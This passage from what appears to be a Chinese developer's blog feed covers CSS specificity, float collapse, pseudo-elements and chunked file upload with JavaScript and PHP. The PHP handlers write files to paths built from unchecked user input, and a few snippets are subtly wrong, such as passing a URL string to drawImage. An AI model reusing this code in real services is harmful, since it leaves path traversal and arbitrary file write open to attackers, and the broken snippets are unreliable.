color="#FF8C00">继承的样式没有权值。</font></p><p>比较规则遵循如下法则：</p><ul><li>选择器都有一个权值，权值越大越优先；</li><li>当权值相等时，<font color="#FF8C00">后出现的样式表设置要优于先出现的样式</font>表设置；</li><li>创作者的规则高于浏览者：<font color="#FF00FF">即网页编写者设置的 CSS 样式的优先权高于浏览器所设置的样式</font>；</li><li>继承的 CSS 样式不如后来指定的 CSS 样式；</li><li>在同一组属性设置中<font color="#FF8C00">标有!important规则的优先级最大</font></li><li><font color="#FF00FF">通配符、子选择器、相邻选择器等的。虽然权值为0000，但是也比继承的样式优先</font>。</li></ul><p><strong>！important</strong></p><ol><li>!important 的作用是提升优先级，换句话说。加了这句的样式的优先级是最高的（比内联样式的优先级还高)。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt; </span><br><span class="line">p&#123;</span><br><span class="line">    color:red !important;</span><br><span class="line">&#125; </span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;p style=&quot;color:blue;&quot;&gt;我显示红色&lt;/p&gt;</span><br></pre></td></tr></table></figure><ol start="2"><li>ie7+和别的浏览器对important的这种作用的支持度都很好。<font color="#FF8C00">只有ie6有些bug</font></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p&#123;</span><br><span class="line">      color:red !important;</span><br><span class="line">      color:blue;    </span><br><span class="line"> &#125;//会显示blue</span><br></pre></td></tr></table></figure><p>但是这并不说明ie6不支持important，只是支持上有些bug。看下面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p&#123;</span><br><span class="line">     color:red !important;  </span><br><span class="line">&#125;</span><br><span class="line">p&#123;</span><br><span class="line">    color:blue;  </span><br><span class="line">&#125; //这样就会显示的是red。说明ie6还是支持important的。&lt;/pre&gt;</span><br></pre></td></tr></table></figure><h1 id="盒子塌陷是什么？"><a href="#盒子塌陷是什么？" class="headerlink" title="盒子塌陷是什么？"></a>盒子塌陷是什么？</h1><blockquote><p><strong>本应该在父盒子内部的元素跑到了外部。</strong></p></blockquote><p><strong>关于盒子塌陷的几种解决方法:</strong><br>（1）最简单，直接，粗暴的方法就是盒子大小写死，给每个盒子设定固定的width和height，直到合适为止，这样的<font color="#FF8C00">好处是简单方便，兼容性好，适合只改动少量内容不涉及盒子排布的版面。缺点是非自适应，浏览器的窗口大小直接影响用户体验。</font><br>（2）给外部的父盒子也添加浮动，让其也脱离标准文档流，这种方法方便，<font color="#FF8C00">但是对页面的布局不是很友好，不易维护。</font><br>（3）给父盒子添加overflow属性。</p><ul><li>overflow:auto; 有可能出现滚动条，影响美观。</li><li>overflow:hidden; 可能会带来内容不可见的问题。</li></ul><p>（4）父盒子里最下方<font color="#FF8C00">引入清除浮动块。</font>最简单的有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;br style=&quot;clear:both;&quot;/&gt;</span><br></pre></td></tr></table></figure><p><strong>有很多人是这么解决的，但是我们并不推荐，因为其引入了不必要的冗余元素 。</strong><br>(5)用after伪元素清除浮动<br>给外部盒子的after伪元素<font color="#FF8C00">设置clear属性</font>，再隐藏它<br>这其实是对空盒子方案的改进，一种纯CSS的解决方案，不用引入冗余元素。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.clearfix &#123;*zoom: 1;&#125;</span><br><span class="line">.clearfix:before,.clearfix:after &#123;</span><br><span class="line">display: table;</span><br><span class="line">line-height: 0;</span><br><span class="line">content: &quot;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">.clearfix:after &#123;clear: both;&#125;</span><br></pre></td></tr></table></figure><p><font color="#FF8C00">这也是bootstrap框架采用的清除浮动的方法。<br>这是一种纯CSS的解决浮动造成盒子塌陷方法，没有引入任何冗余元素，推荐使用此方法来解决CSS盒子塌陷。</font><br>备注：第五种方法虽好，但是低版本IE不兼容，具体选择哪种解决方法，可根据实际情况决定。<br>(6) 给父盒子添加border<br>(7) 给父盒子设置padding-top</p><h1 id="为什么会出现盒子塌陷？"><a href="#为什么会出现盒子塌陷？" class="headerlink" title="为什么会出现盒子塌陷？"></a>为什么会出现盒子塌陷？</h1><p>当父元素没设置足够大小的时候，而子元素设置了浮动的属性，子元素就会跳出父元素的边界（脱离文档流），尤其是当父元素的高度为auto时，而父元素中又没有其它非浮动的可见元素时，父盒子的高度就会直接塌陷为零， 我们称这是CSS高度塌陷。</p><h1 id="css-伪类与伪元素区别"><a href="#css-伪类与伪元素区别" class="headerlink" title="css 伪类与伪元素区别"></a>css 伪类与伪元素区别</h1><h2 id="伪类-pseudo-classes"><a href="#伪类-pseudo-classes" class="headerlink" title="伪类(pseudo-classes)"></a>伪类(pseudo-classes)</h2><ul><li>其核⼼就是⽤来<font color="#FF8C00">选择DOM树之外的信息,</font>不能够被普通选择器选择的⽂档之外的元素，⽤来添加⼀些选择器的特殊效果。</li><li>⽐如<font color="#FF8C00">:hover :active :visited :link :visited :first-child :focus :lang</font>等</li><li>由于状态的变化是⾮静态的，所以元素达到⼀个特定状态时，它可能得到⼀个伪类的样式；当状态改变时，它⼜会失去这个样式。</li><li>由此可以看出，它的功能和class有些类似，但它是基于⽂档之外的抽象，所以叫 伪类。<h2 id="伪元素-Pseudo-elements"><a href="#伪元素-Pseudo-elements" class="headerlink" title="伪元素(Pseudo-elements)"></a>伪元素(Pseudo-elements)</h2></li><li>DOM树没有定义的虚拟元素</li><li>核⼼就是需要<font color="#FF8C00">创建通常不存在于⽂档中的元素，</font></li><li>⽐如::before ::after 它选择的是元素指定内容，<font color="#FF8C00">表示选择元素内容的之前内容或之后内容</font>。</li><li>伪元素控制的内容和元素是没有差别的，但是<font color="#FF00FF">它本身只是基于元素的抽象，并不存在于⽂档中，所以称为伪元素。</font>⽤于将特殊的效果添加到某些选择器</li></ul><h2 id="伪类与伪元素的区别"><a href="#伪类与伪元素的区别" class="headerlink" title="伪类与伪元素的区别"></a>伪类与伪元素的区别</h2><ol><li>表示⽅法</li></ol><ul><li>CSS2 中伪类、伪元素都是以单冒号:表示,</li><li>CSS2.1 后规定伪类⽤单冒号表示,伪元素⽤双冒号::表示，</li><li>浏览器同样接受 CSS2 时代已经存在的伪元素(:before, :after, :first-line, :first-letter 等)的单冒号写法。</li><li>CSS2 之后所有新增的伪元素(如::selection)，应该采⽤双冒号的写法。</li><li>CSS3中，伪类与伪元素在语法上也有所区别，<font color="#FF8C00">伪元素修改为以::开头。浏览器对以:开头的伪元素也继续⽀持，但建议规范书写为::开头</font></li></ul><ol start="2"><li>定义不同</li></ol><ul><li>伪类即假的类，可以添加类来达到效果</li><li>伪元素即假元素，需要通过添加元素才能达到效果</li></ul><ol start="3"><li>总结:</li></ol><ul><li>伪类和伪元素都是⽤来表示<font color="#FF8C00">⽂档树以外</font>的”元素”。</li><li>伪类和伪元素分别<font color="#FF8C00">⽤单冒号:和双冒号::来表示</font>。</li><li>伪类和伪元素的区别，关键点在于如果没有伪元素(或伪类)，</li><li><font color="#FF8C00">是否需要添加元素才能达到效果，如果是则是伪元素，反之则是伪类</font></li><li>伪类和伪元素都不出现在源⽂件和DOM树中。也就是说在html源⽂件中是看不到伪类和伪元素的。</li><li>伪类其实就是基于普通DOM元素⽽产⽣的不同状态，他是DOM元素的某⼀特征。</li><li>伪元素能够创建在DOM树中不存在的抽象对象，⽽且这些抽象对象是能够访问到的。</li></ul><h1 id="行内元素的margin-和-padding"><a href="#行内元素的margin-和-padding" class="headerlink" title="行内元素的margin 和 padding"></a>行内元素的margin 和 padding</h1><ul><li>水平方向：水平方向上，都有效；</li><li>垂直方向：垂直方向上，都无效；（<font color="#FF00FF">padding-top和padding-bottom会显示出效果，但是高度不会撑开，不会对周围元素有影响</font>）</li></ul><h1 id="min-width-max-width-和-min-height-max-height-属性间的覆盖规则？"><a href="#min-width-max-width-和-min-height-max-height-属性间的覆盖规则？" class="headerlink" title="min-width/max-width 和 min-height/max-height 属性间的覆盖规则？"></a>min-width/max-width 和 min-height/max-height 属性间的覆盖规则？</h1><ul><li><font color="#FF00FF">max-width 会覆盖 width，即使 width 是行内样式或者设置了 !important</font>。</li><li><font color="#FF00FF">min-width 会覆盖 max-width，此规则发生在 min-width 和 max-width 冲突的时候；</font></li></ul><h1 id="浏览器是怎样解析CSS选择器的？"><a href="#浏览器是怎样解析CSS选择器的？" class="headerlink" title="浏览器是怎样解析CSS选择器的？"></a>浏览器是怎样解析CSS选择器的？</h1><p>CSS选择器的解析是从<font color="#FF00FF">右向左解析</font>的。若从左向右的匹配，发现不符合规则，需要进行回溯，会损失很多性能。<font color="#FF00FF">若从右向左匹配，先找到所有的最右节点，对于每一个节点，向上寻找其父节点直到找到根元素或满足条件的匹配规则，则结束这个分支的遍历</font>。两种匹配规则的性能差别很大，是因为从右向左的匹配在第一步就筛选掉了大量的不符合条件的最右节点(叶子节点)，而从左向右的匹配规则的性能都浪费在了失败的查找上面。而<font color="#FF00FF">在 CSS解析完毕后,需要将解析的结果与DOM Tree的内容-起进行分析建立-棵Render Tree，最终用来进行绘图</font>。<font color="#FF8C00">在建立Render Tree时(WebKit 中的「Attachment」过程)， 浏览器就要为每个DOM Tree中的元素根据CSS的解析结果(Style Rules)来确定生成怎样的Render Tree。</font></p>]]></content>
      
      
      <categories>
          
          <category> plan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>应用(第八天)</title>
      <link href="/2022/08/04/%E5%BA%94%E7%94%A8(%E7%AC%AC%E5%85%AB%E5%A4%A9)/"/>
      <url>/2022/08/04/%E5%BA%94%E7%94%A8(%E7%AC%AC%E5%85%AB%E5%A4%A9)/</url>
      
        <content type="html"><![CDATA[<h1 id="文件异步上传怎么实现"><a href="#文件异步上传怎么实现" class="headerlink" title="文件异步上传怎么实现"></a>文件异步上传怎么实现</h1><h2 id="普通表单上传"><a href="#普通表单上传" class="headerlink" title="普通表单上传"></a>普通表单上传</h2><p>使用PHP来展示常规的表单上传是一个不错的选择。首先构建文件上传的表单，并指定表单的提交内容类型为enctype=”multipart/form-data”，表明表单需要上传<font color="#FF00FF">二进制</font>数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">  &lt;input type=&quot;file&quot; name=&quot;myfile&quot;&gt;</span><br><span class="line">  &lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>然后编写index.php上传文件接收代码，使用move_uploaded_file方法即可(php大法好…)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$imgName = &#x27;IMG&#x27;.time().&#x27;.&#x27;.str_replace(&#x27;image/&#x27;,&#x27;&#x27;,$_FILES[&quot;myfile&quot;][&#x27;type&#x27;]);</span><br><span class="line">$fileName =  &#x27;upload/&#x27;.$imgName;</span><br><span class="line">// 移动上传文件至指定upload文件夹下，并根据返回值判断操作是否成功</span><br><span class="line">if (move_uploaded_file($_FILES[&#x27;myfile&#x27;][&#x27;tmp_name&#x27;], $fileName))&#123;</span><br><span class="line">    echo $fileName;</span><br><span class="line">&#125;else &#123;</span><br><span class="line">    echo &quot;nonn&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>form表单上传大文件时，很容易<font color="#FF00FF">遇见服务器超时的问题。通过xhr</font>，前端也可以进行异步上传文件的操作，一般由两个思路。</p><h3 id="文件编码上传"><a href="#文件编码上传" class="headerlink" title="文件编码上传"></a>文件编码上传</h3><p>第一个思路是将文件进行编码，然后在服务端进行解码，之前写过一篇在前端实现图片压缩上传的博客，其主要实现原理就是将图片转换成base64进行传递</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var imgURL = URL.createObjectURL(file);</span><br><span class="line">ctx.drawImage(imgURL, 0, 0);</span><br><span class="line">// 获取图片的编码，然后将图片当做是一个很长的字符串进行传递</span><br><span class="line">var data = canvas.toDataURL(&quot;image/jpeg&quot;, 0.5); </span><br></pre></td></tr></table></figure><p>在服务端需要做的事情也比较简单，首先解码base64，然后保存图片即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$imgData = $_REQUEST[&#x27;imgData&#x27;];</span><br><span class="line">$base64 = explode(&#x27;,&#x27;, $imgData)[1];</span><br><span class="line">$img = base64_decode($base64);</span><br><span class="line">$url = &#x27;./test.jpg&#x27;;</span><br><span class="line">if (file_put_contents($url, $img)) &#123;</span><br><span class="line">    exit(json_encode(array(</span><br><span class="line">        url =&gt; $url</span><br><span class="line">    )));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>base64编码的缺点在于其体积比原图片更大（因为Base64将三个字节转化成四个字节，因此编码后的文本，会比原文本大出三分之一左右），对于体积很大的文件来说，上传和解析的时间会明显增加。<br>更多关于base64的知识，可以参考Base64笔记。<br>除了进行base64编码，还可以在前端直接读取文件内容后以二进制格式上传</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// 读取二进制文件</span><br><span class="line">function readBinary(text)&#123;</span><br><span class="line">   var data = new ArrayBuffer(text.length);</span><br><span class="line">   var ui8a = new Uint8Array(data, 0);</span><br><span class="line">   for (var i = 0; i &lt; text.length; i++)&#123; </span><br><span class="line">     ui8a[i] = (text.charCodeAt(i) &amp; 0xff);</span><br><span class="line">   &#125;</span><br><span class="line">   console.log(ui8a)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var reader = new FileReader();</span><br><span class="line">reader.onload = function()&#123;</span><br><span class="line">      readBinary(this.result) // 读取result或直接上传</span><br><span class="line">&#125;</span><br><span class="line">// 把从input里读取的文件内容，放到fileReader的result字段里</span><br><span class="line">reader.readAsBinaryString(file);</span><br></pre></td></tr></table></figure><h3 id="formData异步上传"><a href="#formData异步上传" class="headerlink" title="formData异步上传"></a>formData异步上传</h3><p>FormData对象<font color="#FF8C00">主要用来组装一组用 XMLHttpRequest发送请求的键/值对</font>，可以更加灵活地发送Ajax请求。可以使用FormData来模拟表单提交。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">let files = e.target.files // 获取input的file对象</span><br><span class="line">let formData = new FormData();</span><br><span class="line">formData.append(&#x27;file&#x27;, file);</span><br><span class="line">axios.post(url, formData);</span><br></pre></td></tr></table></figure><p>服务端处理方式与直接form表单请求基本相同。</p><ul><li>iframe无刷新页面</li></ul><p>在低版本的浏览器（如IE）上，xhr是不支持直接上传formdata的，因此只能用form来上传文件，而form提交本身会进行页面跳转，这是因为form表单的target属性导致的，其取值有</p><ul><li>_self，默认值，在相同的窗口中打开响应页面</li><li>_blank，在新窗口打开</li><li>_parent，在父窗口打开</li><li>_top，在最顶层的窗口打开</li><li>framename，在指定名字的iframe中打开</li></ul><p>如果需要让用户体验异步上传文件的感觉，可以通过framename指定iframe来实现。<font color="#FF00FF">把form的target属性设置为一个看不见的iframe，那么返回的数据就会被这个iframe接受，</font>因此只有该iframe会被刷新，至于返回结果，也可以通过解析这个iframe内的文本来获取。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">function upload()&#123;</span><br><span class="line">    var now = +new Date()</span><br><span class="line">    var id = &#x27;frame&#x27; + now</span><br><span class="line">    $(&quot;body&quot;).append(`&lt;iframe style=&quot;display:none;&quot; name=&quot;$&#123;id&#125;&quot; id=&quot;$&#123;id&#125;&quot; /&gt;`);</span><br><span class="line"></span><br><span class="line">    var $form = $(&quot;#myForm&quot;)</span><br><span class="line">    $form.attr(&#123;</span><br><span class="line">        &quot;action&quot;: &#x27;/index.php&#x27;,</span><br><span class="line">        &quot;method&quot;: &quot;post&quot;,</span><br><span class="line">        &quot;enctype&quot;: &quot;multipart/form-data&quot;,</span><br><span class="line">        &quot;encoding&quot;: &quot;multipart/form-data&quot;,</span><br><span class="line">        &quot;target&quot;: id</span><br><span class="line">    &#125;).submit()</span><br><span class="line"></span><br><span class="line">    $(&quot;#&quot;+id).on(&quot;load&quot;, function()&#123;</span><br><span class="line">        var content = $(this).contents().find(&quot;body&quot;).text()</span><br><span class="line">        try&#123;</span><br><span class="line">            var data = JSON.parse(content)</span><br><span class="line">        &#125;catch(e)&#123;</span><br><span class="line">            console.log(e)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="大文件上传"><a href="#大文件上传" class="headerlink" title="大文件上传"></a>大文件上传</h2><p>现在来看看在上面提到的几种上传方式中实现大文件上传会遇见的超时问题，</p><ul><li>表单上传和iframe无刷新页面上传，<font color="#FF00FF">实际上都是通过form标签进行上传文件，这种方式将整个请求完全交给浏览器处理，当上传大文件时，可能会遇见请求超时的情形</font></li><li>通过fromData，其实际也是在<font color="#FF8C00">xhr</font>中封装一组请求参数，用来模拟表单请求，无法避免大文件上传超时的问题</li><li><font color="#FF8C00">编码上传</font>，我们可以比较灵活地控制上传的内容</li></ul><p>大文件上传最主要的问题就在于：<font color="#FF8C00">在同一个请求中，要上传大量的数据，导致整个过程会比较漫长，且失败后需要重头开始上传。</font>试想，如果我们将这个请求拆分成多个请求，每个请求的时间就会缩短，且如果某个请求失败，只需要重新发送这一次请求即可，无需从头开始，这样是否可以解决大文件上传的问题呢？</p><p>综合上面的问题，看来大文件上传需要实现下面几个需求</p><ul><li>支持拆分上传请求(即切片)</li><li>支持断点续传</li><li>支持显示上传进度和暂停上传<br>接下来让我们依次实现这些功能，看起来最主要的功能应该就是切片了。<h3 id="文件切片"><a href="#文件切片" class="headerlink" title="文件切片"></a>文件切片</h3>编码方式上传中，在前端我们只要先获取文件的二进制内容，然后对其内容进行拆分，最后将每个切片上传到服务端即可。在JavaScript中，<font color="#FF00FF">文件FIle对象是Blob对象的子类，Blob对象包含一个重要的方法slice</font>，通过这个方法，我们就可以对二进制文件进行拆分。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function slice(file, piece = 1024 * 1024 * 5) &#123;</span><br><span class="line"> let totalSize = file.size; // 文件总大小</span><br><span class="line"> let start = 0; // 每次上传的开始字节</span><br><span class="line"> let end = start + piece; // 每次上传的结尾字节</span><br><span class="line"> let chunks = []</span><br><span class="line"> while (start &lt; totalSize) &#123;</span><br><span class="line"> // 根据长度截取每次需要上传的数据</span><br><span class="line"> // File对象继承自Blob对象，因此包含slice方法</span><br><span class="line"> let blob = file.slice(start, end); </span><br><span class="line"> chunks.push(blob)</span><br><span class="line"> start = end;</span><br><span class="line"> end = start + piece;</span><br><span class="line"> &#125;</span><br><span class="line"> return chunks</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将文件拆分成piece大小的分块，然后每次请求只需要上传这一个部分的分块即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">let file = document.querySelector(&quot;[name=file]&quot;).files[0];</span><br><span class="line">const LENGTH = 1024 * 1024 * 0.1;</span><br><span class="line">let chunks = slice(file, LENGTH); // 首先拆分切片</span><br><span class="line">chunks.forEach(chunk=&gt;&#123;</span><br><span class="line"> let fd = new FormData();</span><br><span class="line"> fd.append(&quot;file&quot;, chunk);</span><br><span class="line"> post(&#x27;/mkblk.php&#x27;, fd)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>服务器接收到这些切片后，再将他们拼接起来就可以了，下面是PHP拼接切片的示例代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$filename = &#x27;./upload/&#x27; . $_POST[&#x27;filename&#x27;];//确定上传的文件名</span><br><span class="line">//第一次上传时没有文件，就创建文件，此后上传只需要把数据追加到此文件中</span><br><span class="line">if(!file_exists($filename))&#123;</span><br><span class="line"> move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;],$filename);</span><br><span class="line">&#125;else&#123;</span><br><span class="line"> file_put_contents($filename,file_get_contents($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]),FILE_APPEND);</span><br><span class="line"> echo $filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>测试时<font color="#FF00FF">记得修改nginx的server配置，否则大文件可能会提示413 Request Entity Too Large的错误</font>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    // ...</span><br><span class="line">    client_max_body_size 50m;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>上面这种方式来存在一些问题</strong></p><ul><li><font color="#FF00FF">无法识别一个切片是属于哪一个切片的</font>，当同时发生多个请求时，追加的文件内容会出错</li><li>切片上传接口是<font color="#FF00FF">异步的，无法保证服务器接收到的切片是按照请求顺序拼接的</font></li></ul><p>因此接下来我们来看看应该如何在服务端<strong>还原切片</strong>。</p><p>在后端需要将多个相同文件的切片还原成一个文件，上面这种处理切片的做法存在下面几个问题</p><ul><li>如何识别多个切片是来自于同一个文件的，这个可以在每个切片请求上传递一个相同文件的context参数</li><li>如何将多个切片还原成一个文件</li><li>确认所有切片都已上传，这个可以通过客户端在切片全部上传后调用mkfile接口来通知服务端进行拼接</li><li><font color="#FF00FF">找到同一个context下的所有切片</font>，确认每个切片的顺序，这个可以在每个切片上标记一个位置索引值</li><li><font color="#FF00FF">按顺序拼接切</font>片，还原成文件</li></ul><p>上面有一个重要的参数，即context，我们<font color="#FF00FF">需要获取为一个文件的唯一标识</font>，可以通过下面两种方式获取</p><ul><li>根据文件名、文件长度等基本信息进行拼接，为了避免多个用户上传相同的文件，可以再额外拼接用户信息如uid等保证唯一性</li><li>根据文件的二进制内容计算<font color="#FF00FF">文件的hash</font>，这样只要文件内容不一样，则标识也会不一样，缺点在于计算量比较大.</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// 获取context，同一个文件会返回相同的值</span><br><span class="line">function createContext(file) &#123;</span><br><span class="line">     return file.name + file.length</span><br><span class="line">&#125;</span><br><span class="line">let file = document.querySelector(&quot;[name=file]&quot;).files[0];</span><br><span class="line">const LENGTH = 1024 * 1024 * 0.1;</span><br><span class="line">let chunks = slice(file, LENGTH);</span><br><span class="line">// 获取对于同一个文件，获取其的context</span><br><span class="line">let context = createContext(file);</span><br><span class="line">let tasks = [];</span><br><span class="line">chunks.forEach((chunk, index) =&gt; &#123;</span><br><span class="line"> let fd = new FormData();</span><br><span class="line"> fd.append(&quot;file&quot;, chunk);</span><br><span class="line"> // 传递context</span><br><span class="line"> fd.append(&quot;context&quot;, context);</span><br><span class="line"> // 传递切片索引值</span><br><span class="line"> fd.append(&quot;chunk&quot;, index + 1);</span><br><span class="line"></span><br><span class="line"> tasks.push(post(&quot;/mkblk.php&quot;, fd));</span><br><span class="line">&#125;);</span><br><span class="line">// 所有切片上传完毕后，调用mkfile接口</span><br><span class="line">Promise.all(tasks).then(res =&gt; &#123;</span><br><span class="line"> let fd = new FormData();</span><br><span class="line"> fd.append(&quot;context&quot;, context);</span><br><span class="line"> fd.append(&quot;chunks&quot;, chunks.length);</span><br><span class="line"> post(&quot;/mkfile.php&quot;, fd).then(res =&gt; &#123;</span><br><span class="line"> console.log(res);</span><br><span class="line"> &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在mkblk.php接口中，我们通过context来保存同一个文件相关的切片</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// mkblk.php</span><br><span class="line">$context = $_POST[&#x27;context&#x27;];</span><br><span class="line">$path = &#x27;./upload/&#x27; . $context;</span><br><span class="line">if(!is_dir($path))&#123;</span><br><span class="line"> mkdir($path);</span><br><span class="line">&#125;</span><br><span class="line">// 把同一个文件的切片放在相同的目录下</span><br><span class="line">$filename = $path .&#x27;/&#x27;. $_POST[&#x27;chunk&#x27;];</span><br><span class="line">$res = move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;],$filename);</span><br></pre></td></tr></table></figure><p>除了上面这种简单通过目录区分切片的方法之外，还可以将切片信息保存在数据库来进行索引。接下来是mkfile.php接口的实现，这个接口会在所有切片上传后调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// mkfile.php</span><br><span class="line">$context = $_POST[&#x27;context&#x27;];</span><br><span class="line">$chunks = (int)$_POST[&#x27;chunks&#x27;];</span><br><span class="line">//合并后的文件名</span><br><span class="line">$filename = &#x27;./upload/&#x27; . $context . &#x27;/file.jpg&#x27;; </span><br><span class="line">for($i = 1; $i &lt;= $chunks; ++$i)&#123;</span><br><span class="line"> $file = &#x27;./upload/&#x27;.$context. &#x27;/&#x27; .$i; // 读取单个切块</span><br><span class="line"> $content = file_get_contents($file);</span><br><span class="line"> if(!file_exists($filename))&#123;</span><br><span class="line"> $fd = fopen($filename, &quot;w+&quot;);</span><br><span class="line"> &#125;else&#123;</span><br><span class="line"> $fd = fopen($filename, &quot;a&quot;);</span><br><span class="line"> &#125;</span><br><span class="line"> fwrite($fd, $content); // 将切块合并到一个文件上</span><br><span class="line">&#125;</span><br><span class="line">echo $filename;</span><br><span 